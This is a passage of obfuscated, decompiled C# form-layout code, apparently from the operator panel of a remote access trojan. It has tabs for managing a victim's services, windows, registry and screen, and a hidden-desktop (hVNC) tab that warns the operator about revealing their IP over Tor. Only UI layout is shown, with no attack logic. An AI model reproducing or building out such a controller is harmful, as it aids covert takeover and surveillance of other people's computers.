        this.vmethod_666().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_666().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_666().Name = "tsServicesSelected";
        this.vmethod_666().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_666().Size = new Size(0x195, 0x11);
        this.vmethod_666().Spring = true;
        this.vmethod_666().Text = "Selected: N/A";
        this.vmethod_666().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_574().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_574().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_574().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_574().Maximum = 1;
        this.vmethod_574().Name = "tsServicesProgress";
        this.vmethod_574().Size = new Size(0x52, 15);
        this.vmethod_574().Step = 1;
        this.vmethod_574().Style = ProgressBarStyle.Continuous;
        this.vmethod_580().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray40 = new ToolStripItem[] { this.vmethod_582(), this.vmethod_584(), this.vmethod_598(), this.vmethod_594(), this.vmethod_586() };
        this.vmethod_580().Items.AddRange(itemArray40);
        this.vmethod_580().Name = "cmsConnections";
        this.vmethod_580().Size = new Size(170, 0x52);
        this.vmethod_582().Name = "ToolStripMenuItem22";
        this.vmethod_582().Size = new Size(0xa9, 0x16);
        this.vmethod_582().Text = "Refresh";
        this.vmethod_584().Name = "ToolStripSeparator6";
        this.vmethod_584().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray41 = new ToolStripItem[] { this.vmethod_600(), this.vmethod_602(), this.vmethod_604(), this.vmethod_606(), this.vmethod_608(), this.vmethod_610() };
        this.vmethod_598().DropDownItems.AddRange(itemArray41);
        this.vmethod_598().Name = "OperationsToolStripMenuItem2";
        this.vmethod_598().Size = new Size(0xa9, 0x16);
        this.vmethod_598().Text = "Operations";
        this.vmethod_600().Name = "StartToolStripMenuItem";
        this.vmethod_600().Size = new Size(0x7b, 0x16);
        this.vmethod_600().Text = "Start";
        this.vmethod_602().Name = "PauseToolStripMenuItem";
        this.vmethod_602().Size = new Size(0x7b, 0x16);
        this.vmethod_602().Text = "Pause";
        this.vmethod_604().Name = "ContinueToolStripMenuItem1";
        this.vmethod_604().Size = new Size(0x7b, 0x16);
        this.vmethod_604().Text = "Continue";
        this.vmethod_606().Name = "StopToolStripMenuItem";
        this.vmethod_606().Size = new Size(0x7b, 0x16);
        this.vmethod_606().Text = "Stop";
        this.vmethod_608().Name = "ToolStripMenuItem26";
        this.vmethod_608().Size = new Size(120, 6);
        this.vmethod_610().Name = "UninstallToolStripMenuItem";
        this.vmethod_610().Size = new Size(0x7b, 0x16);
        this.vmethod_610().Text = "Uninstall";
        this.vmethod_594().Name = "ToolStripSeparator8";
        this.vmethod_594().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray42 = new ToolStripItem[] { this.vmethod_588(), this.vmethod_590(), this.vmethod_592() };
        this.vmethod_586().DropDownItems.AddRange(itemArray42);
        this.vmethod_586().Name = "ToolStripMenuItem23";
        this.vmethod_586().Size = new Size(0xa9, 0x16);
        this.vmethod_586().Text = "Copy to clipboard";
        this.vmethod_588().Name = "ToolStripMenuItem24";
        this.vmethod_588().Size = new Size(0x76, 0x16);
        this.vmethod_588().Text = "Selected";
        this.vmethod_590().Name = "ToolStripSeparator7";
        this.vmethod_590().Size = new Size(0x73, 6);
        this.vmethod_592().Name = "ToolStripMenuItem25";
        this.vmethod_592().Size = new Size(0x76, 0x16);
        this.vmethod_592().Text = "All";
        this.vmethod_612().Controls.Add(this.vmethod_614());
        this.vmethod_612().Controls.Add(this.vmethod_616());
        this.vmethod_612().Controls.Add(this.vmethod_622());
        this.vmethod_612().Controls.Add(this.vmethod_624());
        this.vmethod_612().Location = new Point(4, 5);
        this.vmethod_612().Name = "tbWindows";
        this.vmethod_612().Padding = new Padding(3);
        this.vmethod_612().Size = new Size(0x3d0, 0x221);
        this.vmethod_612().TabIndex = 14;
        this.vmethod_612().Text = "Windows";
        this.vmethod_612().UseVisualStyleBackColor = true;
        this.vmethod_614().set_BackColor(SystemColors.Control);
        this.vmethod_614().set_CircleWidth(20f);
        this.vmethod_614().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_614().set_GetAnimationSpeed(100);
        this.vmethod_614().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_614().Location = new Point(0xf1, 0xb8);
        this.vmethod_614().MinimumSize = new Size(80, 80);
        this.vmethod_614().Name = "pbWindowsSplash";
        this.vmethod_614().set_NumberOfCircles(45f);
        this.vmethod_614().set_Radian(180.0);
        this.vmethod_614().Size = new Size(0xa1, 0xa1);
        this.vmethod_614().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_614().TabIndex = 0x36;
        this.vmethod_614().Visible = false;
        this.vmethod_616().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_616().AutoSize = false;
        this.vmethod_616().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_616().Dock = DockStyle.None;
        this.vmethod_616().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray43 = new ToolStripItem[] { this.vmethod_618(), this.vmethod_672(), this.vmethod_620() };
        this.vmethod_616().Items.AddRange(itemArray43);
        this.vmethod_616().Location = new Point(2, 0x20b);
        this.vmethod_616().Name = "ssWindows";
        this.vmethod_616().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_616().Size = new Size(970, 20);
        this.vmethod_616().SizingGrip = false;
        this.vmethod_616().Stretch = false;
        this.vmethod_616().TabIndex = 0x35;
        this.vmethod_616().Text = "stStatus";
        this.vmethod_618().AutoSize = false;
        this.vmethod_618().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_618().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_618().Margin = new Padding(-1, 3, 0, 0);
        this.vmethod_618().Name = "tsWindowsCount";
        this.vmethod_618().Size = new Size(140, 0x11);
        this.vmethod_618().Text = "Windows: N/A";
        this.vmethod_618().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_672().AutoSize = false;
        this.vmethod_672().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_672().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_672().Margin = new Padding(-1, 3, 0, 0);
        this.vmethod_672().Name = "tsWindowsSelected";
        this.vmethod_672().Size = new Size(0x2ea, 0x11);
        this.vmethod_672().Spring = true;
        this.vmethod_672().Text = "Selected: 0";
        this.vmethod_672().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_620().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_620().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_620().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_620().Maximum = 1;
        this.vmethod_620().Name = "tsWindowsProgress";
        this.vmethod_620().Size = new Size(0x52, 15);
        this.vmethod_620().Step = 1;
        this.vmethod_620().Style = ProgressBarStyle.Continuous;
        this.vmethod_628().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray44 = new ToolStripItem[] { this.vmethod_630(), this.vmethod_632(), this.vmethod_634(), this.vmethod_648(), this.vmethod_650() };
        this.vmethod_628().Items.AddRange(itemArray44);
        this.vmethod_628().Name = "cmsConnections";
        this.vmethod_628().Size = new Size(170, 0x52);
        this.vmethod_630().Name = "ToolStripMenuItem27";
        this.vmethod_630().Size = new Size(0xa9, 0x16);
        this.vmethod_630().Text = "Refresh";
        this.vmethod_632().Name = "ToolStripSeparator9";
        this.vmethod_632().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray45 = new ToolStripItem[9];
        itemArray45[0] = this.vmethod_636();
        itemArray45[1] = this.vmethod_638();
        itemArray45[2] = this.vmethod_640();
        itemArray45[3] = this.vmethod_642();
        itemArray45[4] = this.vmethod_658();
        itemArray45[5] = this.vmethod_660();
        itemArray45[6] = this.vmethod_662();
        itemArray45[7] = this.vmethod_644();
        itemArray45[8] = this.vmethod_646();
        this.vmethod_634().DropDownItems.AddRange(itemArray45);
        this.vmethod_634().Name = "ToolStripMenuItem28";
        this.vmethod_634().Size = new Size(0xa9, 0x16);
        this.vmethod_634().Text = "Operations";
        this.vmethod_636().Name = "ToolStripMenuItem29";
        this.vmethod_636().Size = new Size(0x9b, 0x16);
        this.vmethod_636().Text = "Show";
        this.vmethod_638().Name = "ToolStripMenuItem30";
        this.vmethod_638().Size = new Size(0x9b, 0x16);
        this.vmethod_638().Text = "Maximize";
        this.vmethod_640().Name = "ToolStripMenuItem31";
        this.vmethod_640().Size = new Size(0x9b, 0x16);
        this.vmethod_640().Text = "Minimize";
        this.vmethod_642().Name = "ToolStripMenuItem32";
        this.vmethod_642().Size = new Size(0x9b, 0x16);
        this.vmethod_642().Text = "Force minimize";
        this.vmethod_658().Name = "HideToolStripMenuItem";
        this.vmethod_658().Size = new Size(0x9b, 0x16);
        this.vmethod_658().Text = "Hide";
        this.vmethod_660().Name = "ToolStripMenuItem37";
        this.vmethod_660().Size = new Size(0x98, 6);
        this.vmethod_662().Name = "ChangeTitleToolStripMenuItem";
        this.vmethod_662().Size = new Size(0x9b, 0x16);
        this.vmethod_662().Text = "Change title";
        this.vmethod_644().Name = "ToolStripSeparator10";
        this.vmethod_644().Size = new Size(0x98, 6);
        this.vmethod_646().Name = "ToolStripMenuItem33";
        this.vmethod_646().Size = new Size(0x9b, 0x16);
        this.vmethod_646().Text = "Close";
        this.vmethod_648().Name = "ToolStripSeparator11";
        this.vmethod_648().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray46 = new ToolStripItem[] { this.vmethod_652(), this.vmethod_654(), this.vmethod_656() };
        this.vmethod_650().DropDownItems.AddRange(itemArray46);
        this.vmethod_650().Name = "ToolStripMenuItem34";
        this.vmethod_650().Size = new Size(0xa9, 0x16);
        this.vmethod_650().Text = "Copy to clipboard";
        this.vmethod_652().Name = "ToolStripMenuItem35";
        this.vmethod_652().Size = new Size(0x76, 0x16);
        this.vmethod_652().Text = "Selected";
        this.vmethod_654().Name = "ToolStripSeparator12";
        this.vmethod_654().Size = new Size(0x73, 6);
        this.vmethod_656().Name = "ToolStripMenuItem36";
        this.vmethod_656().Size = new Size(0x76, 0x16);
        this.vmethod_656().Text = "All";
        this.vmethod_722().Controls.Add(this.vmethod_754());
        this.vmethod_722().Controls.Add(this.vmethod_732());
        this.vmethod_722().Controls.Add(this.vmethod_744());
        this.vmethod_722().Controls.Add(this.vmethod_746());
        this.vmethod_722().Controls.Add(this.vmethod_752());
        this.vmethod_722().Controls.Add(this.vmethod_724());
        this.vmethod_722().Controls.Add(this.vmethod_726());
        this.vmethod_722().Controls.Add(this.vmethod_728());
        this.vmethod_722().Controls.Add(this.vmethod_730());
        this.vmethod_722().Controls.Add(this.vmethod_748());
        this.vmethod_722().Controls.Add(this.vmethod_750());
        this.vmethod_722().Location = new Point(4, 5);
        this.vmethod_722().Name = "tbRegistry";
        this.vmethod_722().Size = new Size(0x3d0, 0x221);
        this.vmethod_722().TabIndex = 15;
        this.vmethod_722().Text = "Registry";
        this.vmethod_722().UseVisualStyleBackColor = true;
        this.vmethod_754().set_BackColor(SystemColors.Window);
        this.vmethod_754().set_CircleWidth(20f);
        this.vmethod_754().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_754().set_GetAnimationSpeed(100);
        this.vmethod_754().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_754().Location = new Point(0x195, 200);
        this.vmethod_754().MinimumSize = new Size(80, 80);
        this.vmethod_754().Name = "pbRegistrySplash";
        this.vmethod_754().set_NumberOfCircles(45f);
        this.vmethod_754().set_Radian(180.0);
        this.vmethod_754().Size = new Size(0xa1, 0xa1);
        this.vmethod_754().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_754().TabIndex = 0x3b;
        this.vmethod_754().Visible = false;
        this.vmethod_732().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_732().AutoSize = false;
        this.vmethod_732().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_732().Dock = DockStyle.None;
        this.vmethod_732().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray47 = new ToolStripItem[] { this.vmethod_734(), this.vmethod_736(), this.vmethod_738(), this.vmethod_740(), this.vmethod_742() };
        this.vmethod_732().Items.AddRange(itemArray47);
        this.vmethod_732().Location = new Point(2, 0x20b);
        this.vmethod_732().Name = "ssRegistryStatus";
        this.vmethod_732().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_732().Size = new Size(0x3cc, 20);
        this.vmethod_732().SizingGrip = false;
        this.vmethod_732().Stretch = false;
        this.vmethod_732().TabIndex = 0x35;
        this.vmethod_732().Text = "stStatus";
        this.vmethod_734().AutoSize = false;
        this.vmethod_734().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_734().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_734().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_734().Name = "tsRegistryPath";
        this.vmethod_734().Size = new Size(0x24a, 0x11);
        this.vmethod_734().Spring = true;
        this.vmethod_734().Text = "Path: N/A";
        this.vmethod_734().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_736().AutoSize = false;
        this.vmethod_736().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_736().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_736().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_736().Name = "tsRegistryKeys";
        this.vmethod_736().Size = new Size(100, 0x11);
        this.vmethod_736().Text = "Keys:  N/A";
        this.vmethod_736().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_738().AutoSize = false;
        this.vmethod_738().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_738().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_738().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_738().Name = "tsRegistryValues";
        this.vmethod_738().Size = new Size(100, 0x11);
        this.vmethod_738().Text = "Values: N/A";
        this.vmethod_738().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_740().AutoSize = false;
        this.vmethod_740().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_740().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_740().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_740().Name = "tsRegistrySelectedObjects";
        this.vmethod_740().Size = new Size(100, 0x11);
        this.vmethod_740().Text = "Selected: N/A";
        this.vmethod_740().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_742().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_742().ForeColor = Color.SkyBlue;
        this.vmethod_742().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_742().Maximum = 1;
        this.vmethod_742().Name = "tsRegistryProgress";
        this.vmethod_742().Size = new Size(0x52, 15);
        this.vmethod_742().Step = 1;
        this.vmethod_742().Style = ProgressBarStyle.Continuous;
        this.vmethod_744().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_744().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_744().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_744().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_744().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_744().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_744().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_744().Border.HoverVisible = true;
        this.vmethod_744().Border.Rounding = 6;
        this.vmethod_744().Border.Thickness = 1;
        this.vmethod_744().Border.Type = ShapeTypes.Rounded;
        this.vmethod_744().Border.Visible = true;
        this.vmethod_744().DialogResult = DialogResult.None;
        this.vmethod_744().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_744().Image = null;
        this.vmethod_744().Location = new Point(0x387, 6);
        this.vmethod_744().MouseState = MouseStates.Normal;
        this.vmethod_744().Name = "btnRegistryHKEYS";
        this.vmethod_744().Size = new Size(0x44, 0x15);
        this.vmethod_744().TabIndex = 50;
        this.vmethod_744().Text = "Refresh";
        this.vmethod_744().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_744().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_744().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_744().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_744().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_744().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_744().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_744().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_746().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
        this.vmethod_746().DrawMode = DrawMode.OwnerDrawVariable;
        this.vmethod_746().DropDownHeight = 250;
        this.vmethod_746().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_746().Enabled = false;
        this.vmethod_746().FormattingEnabled = true;
        this.vmethod_746().IntegralHeight = false;
        this.vmethod_746().Location = new Point(0xe9, 6);
        this.vmethod_746().Margin = new Padding(2);
        this.vmethod_746().MaxDropDownItems = 10;
        this.vmethod_746().Name = "cbRegistryHKEY";
        this.vmethod_746().Size = new Size(0x29c, 0x15);
        this.vmethod_746().TabIndex = 0x33;
        ToolStripItem[] itemArray48 = new ToolStripItem[] { this.vmethod_768(), this.vmethod_770(), this.vmethod_772() };
        this.vmethod_766().Items.AddRange(itemArray48);
        this.vmethod_766().Name = "cmsRegistryKeys";
        this.vmethod_766().Size = new Size(0x6c, 0x36);
        this.vmethod_768().Name = "AddToolStripMenuItem";
        this.vmethod_768().Size = new Size(0x6b, 0x16);
        this.vmethod_768().Text = "Add";
        this.vmethod_770().Name = "ToolStripMenuItem40";
        this.vmethod_770().Size = new Size(0x68, 6);
        this.vmethod_772().Name = "DeleteToolStripMenuItem4";
        this.vmethod_772().Size = new Size(0x6b, 0x16);
        this.vmethod_772().Text = "Delete";
        ToolStripItem[] itemArray49 = new ToolStripItem[] { this.vmethod_760(), this.vmethod_762(), this.vmethod_764() };
        this.vmethod_758().Items.AddRange(itemArray49);
        this.vmethod_758().Name = "cmsRegistry";
        this.vmethod_758().Size = new Size(0x80, 0x36);
        this.vmethod_760().Name = "AddValueToolStripMenuItem";
        this.vmethod_760().Size = new Size(0x7f, 0x16);
        this.vmethod_760().Text = "Add value";
        this.vmethod_762().Name = "ToolStripMenuItem39";
        this.vmethod_762().Size = new Size(0x7c, 6);
        this.vmethod_764().Name = "DeleteToolStripMenuItem3";
        this.vmethod_764().Size = new Size(0x7f, 0x16);
        this.vmethod_764().Text = "Delete";
        this.vmethod_778().Controls.Add(this.vmethod_808());
        this.vmethod_778().Controls.Add(this.vmethod_794());
        this.vmethod_778().Controls.Add(this.vmethod_788());
        this.vmethod_778().Controls.Add(this.vmethod_790());
        this.vmethod_778().Controls.Add(this.vmethod_780());
        this.vmethod_778().Controls.Add(this.vmethod_782());
        this.vmethod_778().Controls.Add(this.vmethod_784());
        this.vmethod_778().Controls.Add(this.vmethod_786());
        this.vmethod_778().Controls.Add(this.vmethod_806());
        this.vmethod_778().Controls.Add(this.vmethod_796());
        this.vmethod_778().Controls.Add(this.vmethod_798());
        this.vmethod_778().Controls.Add(this.vmethod_800());
        this.vmethod_778().Controls.Add(this.vmethod_802());
        this.vmethod_778().Controls.Add(this.vmethod_804());
        this.vmethod_778().Location = new Point(4, 5);
        this.vmethod_778().Name = "tbHVNC";
        this.vmethod_778().Size = new Size(0x3d0, 0x221);
        this.vmethod_778().TabIndex = 0x10;
        this.vmethod_778().Text = "HVNC";
        this.vmethod_778().UseVisualStyleBackColor = true;
        this.vmethod_808().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_808().BackColor = Color.Transparent;
        this.vmethod_808().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_808().ForeColor = Color.Red;
        this.vmethod_808().Location = new Point(7, 0x1d0);
        this.vmethod_808().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_808().Name = "lblHVNCWarning";
        this.vmethod_808().Size = new Size(0x27e, 0x2b);
        this.vmethod_808().TabIndex = 0x71;
        this.vmethod_808().Text = "WARNING: This client is connected to you via Tor.\r\nPerforming Hidden Desktop/hVNC on this client may reveal your IP.";
        this.vmethod_808().Visible = false;
        this.vmethod_794().BackColor = Color.Transparent;
        this.vmethod_794().Location = new Point(7, 13);
        this.vmethod_794().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_794().Name = "lblHVNC";
        this.vmethod_794().Size = new Size(0x3c1, 0x8a);
        this.vmethod_794().TabIndex = 0x65;
        this.vmethod_794().Text = manager.GetString("lblHVNC.Text");
        this.vmethod_788().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_788().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_788().ForeColor = SystemColors.WindowText;
        this.vmethod_788().Location = new Point(0xd3, 0x205);
        this.vmethod_788().Margin = new Padding(2);
        this.vmethod_788().MaxLength = 0xff;
        this.vmethod_788().Name = "txtHVNCIP";
        this.vmethod_788().Size = new Size(0x87, 20);
        this.vmethod_788().TabIndex = 0x63;
        this.vmethod_790().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_790().BackColor = Color.Transparent;
        this.vmethod_790().Location = new Point(0x9c, 520);
        this.vmethod_790().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_790().Name = "lblHVNCIP";
        this.vmethod_790().Size = new Size(0x33, 13);
        this.vmethod_790().TabIndex = 0x62;
        this.vmethod_790().Text = "Your IP:";
        this.vmethod_790().TextAlign = ContentAlignment.TopRight;
        this.vmethod_780().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_780().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_780().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_780().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_780().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_780().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_780().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_780().Border.HoverVisible = true;
        this.vmethod_780().Border.Rounding = 6;
        this.vmethod_780().Border.Thickness = 1;
        this.vmethod_780().Border.Type = ShapeTypes.Rounded;
        this.vmethod_780().Border.Visible = true;
        this.vmethod_780().DialogResult = DialogResult.None;
        this.vmethod_780().Enabled = false;
        this.vmethod_780().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_780().Image = null;
        this.vmethod_780().Location = new Point(0x4a, 510);
        this.vmethod_780().MouseState = MouseStates.Normal;
        this.vmethod_780().Name = "btnHVNCStop";
        this.vmethod_780().Size = new Size(0x3d, 30);
        this.vmethod_780().TabIndex = 0x61;
        this.vmethod_780().Text = "Stop";
        this.vmethod_780().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_780().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_780().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_780().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_780().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_780().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_780().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_780().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_782().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_782().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_782().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_782().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_782().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_782().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_782().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_782().Border.HoverVisible = true;
        this.vmethod_782().Border.Rounding = 6;
        this.vmethod_782().Border.Thickness = 1;
        this.vmethod_782().Border.Type = ShapeTypes.Rounded;
        this.vmethod_782().Border.Visible = true;
        this.vmethod_782().DialogResult = DialogResult.None;
        this.vmethod_782().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_782().Image = null;
        this.vmethod_782().Location = new Point(8, 510);
        this.vmethod_782().MouseState = MouseStates.Normal;
        this.vmethod_782().Name = "btnHVNCStart";
        this.vmethod_782().Size = new Size(0x3d, 30);
        this.vmethod_782().TabIndex = 0x60;
        this.vmethod_782().Text = "Start";
        this.vmethod_782().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_782().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_782().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_782().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_782().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_782().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_782().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_782().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_784().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_784().Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_784().ForeColor = SystemColors.WindowText;
        this.vmethod_784().Location = new Point(0x182, 0x205);
        this.vmethod_784().Margin = new Padding(2);
        this.vmethod_784().MaxLength = 5;
        this.vmethod_784().Name = "txtHVNCPort";
        this.vmethod_784().Size = new Size(0x39, 20);
        this.vmethod_784().TabIndex = 0x5f;
        this.vmethod_784().Text = "5678";
        this.vmethod_786().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_786().BackColor = Color.Transparent;
        this.vmethod_786().Location = new Point(350, 520);
        this.vmethod_786().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_786().Name = "lblHVNCPort";
        this.vmethod_786().Size = new Size(0x20, 13);
        this.vmethod_786().TabIndex = 0x5e;
        this.vmethod_786().Text = "Port:";
        this.vmethod_786().TextAlign = ContentAlignment.TopRight;
        this.vmethod_118().ImageStream = (ImageListStreamer) manager.GetObject("imgButtons.ImageStream");
        this.vmethod_118().TransparentColor = Color.Transparent;
        this.vmethod_118().Images.SetKeyName(0, "iconfinder_go-previous_118774(2).png");
        this.vmethod_118().Images.SetKeyName(1, "iconfinder_go-next_118773(2).png");
        this.vmethod_118().Images.SetKeyName(2, "iconfinder_refresh green_10513(1).png");
        this.vmethod_118().Images.SetKeyName(3, "icon-home-gr.png");
        this.vmethod_118().Images.SetKeyName(4, "icon-home-gr1.png");
        this.vmethod_118().Images.SetKeyName(5, "information.png");
        this.vmethod_118().Images.SetKeyName(6, "monitor.png");
        this.vmethod_118().Images.SetKeyName(7, "page_white_copy.png");
        this.vmethod_118().Images.SetKeyName(8, "previous.png");
        this.vmethod_118().Images.SetKeyName(9, "processes.png");
        this.vmethod_72().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_72().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray50 = new ToolStripItem[] { this.vmethod_74() };
        this.vmethod_72().Items.AddRange(itemArray50);
        this.vmethod_72().Name = "cmdFileMgrDirs";
        this.vmethod_72().Size = new Size(0x72, 0x1a);
        this.vmethod_74().Name = "RefreshToolStripMenuItem";
        this.vmethod_74().Size = new Size(0x71, 0x16);
        this.vmethod_74().Text = "Refresh";
        this.vmethod_282().WorkerReportsProgress = true;
        this.vmethod_282().WorkerSupportsCancellation = true;
        this.vmethod_288().Interval = 0x3e8;
        this.vmethod_342().Enabled = true;
        this.vmethod_342().Interval = 0x3e8;
        this.vmethod_668().Enabled = true;
        this.vmethod_668().Interval = 0x3e8;
        this.vmethod_792().Enabled = true;
        this.vmethod_248().Anchor = AnchorStyles.Right | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_248().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_248().Location = new Point(0x1c9, 0x2b);
        this.vmethod_248().Margin = new Padding(2);
        this.vmethod_248().Name = "pbScreenSecondary";
        this.vmethod_248().Size = new Size(0x207, 0x1f6);
        this.vmethod_248().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_248().TabIndex = 0x1a;
        this.vmethod_248().TabStop = false;
        this.vmethod_24().Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_24().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_24().Location = new Point(0, 0x2b);
        this.vmethod_24().Margin = new Padding(2);
        this.vmethod_24().Name = "pbScreen";
        this.vmethod_24().Size = new Size(0x3cb, 0x1f6);
        this.vmethod_24().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_24().TabIndex = 3;
        this.vmethod_24().TabStop = false;
        this.vmethod_120().set_Animated(true);
        this.vmethod_120().set_AnimationInterval(0);
